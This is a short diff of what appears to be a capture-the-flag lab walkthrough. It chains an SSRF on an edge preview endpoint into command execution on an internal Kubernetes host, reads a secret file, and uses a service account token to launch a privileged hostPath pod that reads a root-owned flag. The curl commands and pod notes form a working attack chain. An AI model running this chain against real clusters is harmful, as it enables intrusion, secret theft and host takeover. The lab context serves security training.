@@ -14,8 +14,9 @@ curl -s 'http://edge01/preview?url=http://k8s01/'
 curl -s 'http://edge01/preview?url=http://k8s01/exec?cmd=touch+/tmp/.pwned'
 curl -s 'http://edge01/preview?url=http://k8s01/exec?cmd=cat+/etc/labflags/api-secret.txt'
 # SA token -> API (through the SSRF, inside ?cmd='curl -ks ...')
-# privileged pod: hostPath /host, command cat /host/root/k8s-flag.txt
-#   -> read via /api/v1/namespaces/prod/pods/<name>/log
+# privileged pod: metadata.namespace=prod, hostPath /host,
+#   imagePullPolicy: IfNotPresent (local image!),
+#   command cat /host/root/k8s-flag.txt -> read via pods/<name>/log
 cat > /root/cloudburst-report.txt   # write the chain for the report flag
 ```
 
